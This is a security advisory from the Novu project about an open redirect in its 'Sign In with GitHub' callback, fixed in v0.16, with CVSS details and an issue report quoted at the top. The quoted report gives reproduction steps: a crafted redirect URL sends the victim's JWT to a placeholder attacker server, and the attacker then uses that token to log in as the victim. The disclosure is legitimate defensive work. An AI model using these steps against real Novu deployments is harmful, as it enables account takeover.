| [NV-2228 Open redirect vulnerability](https://linear.app/novu/issue/NV-2228/open-redirect-vulnerability)  Description An open redirect vulnerability exists in `/v1/auth/github/callback`.  An attacker can exploit the vulnerability by tricking a victim to click the malicious URL. A successful exploit allows the attacker to log into novu as the victim.  The vulnerable code: `[https://github.com/novuhq/novu/blob/5f94d65b1ab8d618aed9768a6e2877a1614e10d8/apps/api/src/app/auth/auth.controller.ts#L94-L96`](https://github.com/novuhq/novu/blob/5f94d65b1ab8d618aed9768a6e2877a1614e10d8/apps/api/src/app/auth/auth.controller.ts#L94-L96%60). Steps to reproduce Prerequisite: Enable Sign In with GitHub functionality.  0. [Attacker] Send the following URL to the victim: `[https://<novu\_api>/v1/auth/github?source=web&redirectUrl=http://localhost:pass<attacker\_server>/`](https://%3Cnovu_api%3E/v1/auth/github?source=web&redirectUrl=http://localhost:pass%3Cattacker_server%3E/%60) 1. [Victim] Open the URL in your web browser. 2. [Victim] Log into GitHub if not. 3. [Victim] You will be redirected to `[https://<novu\_api>/v1/auth/github/callback?code=`&state=%7B%22source%22%3A%22web%22%2C%22redirectUrl%22%3A%22http%3A%2F%2Flocalhost%3Apass%40<attacker_server>%2F%22%7D``](https://%3Cnovu_api%3E/v1/auth/github/callback?code=%3Ccode%3E&state=%7B%22source%22%3A%22web%22%2C%22redirectUrl%22%3A%22http%3A%2F%2Flocalhost%3Apass%40%3Cattacker_server%3E%2F%22%7D%60) `in turn `[http://localhost:pass<attacker_server>/?token=<JWT_token>`.](http://localhost:pass%3Cattacker_server%3E/?token=%3CJWT_token%3E%60.) 4. [Attacker] Get the `<JWT_token>` value sent by the victim on step 3 by inspecting the server's log. 5. [Attacker] Open the following URL in your web browser: `[https://<novu_web>/auth/login?token=<JWT_token>`](https://%3Cnovu_web%3E/auth/login?token=%3CJWT_token%3E%60) 6. [Attacker] Confirm you logged in as the victim.` |

## Description

We have recently identified and addressed a significant security vulnerability concerning an open redirect in the "Sign In with GitHub" functionality of our login process. This vulnerability could have allowed an attacker to force a victim into opening a malicious URL and thus, potentially log into Novu under the victim's account gaining full control of the account. This flaw has been fixed in v0.16.

### Am I affected?

This vulnerability only affected the Novu Cloud and Open-Source deployments if you have **manually** enabled the GitHub OAuth on your self-hosted instance of Novu.

## Vulnerability Details

* **Severity:** Medium
* **CVSS Score:** 5.4
* **Affected Component:** Sign In with GitHub functionality
* **Vulnerable Version:** <= v0.15
* **Fixed in Version:** v0.16
* **Fixed in PR:** ([#3510](https://github.com/novuhq/novu/pull/3510))

## Description

An open redirect vulnerability was found in the "Sign In with GitHub" functionality. This vulnerability allowed an attacker to craft a malicious URL, which, when accessed by the victim by tricking him into clicking it, could lead to the attacker logging into the application as the victim.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
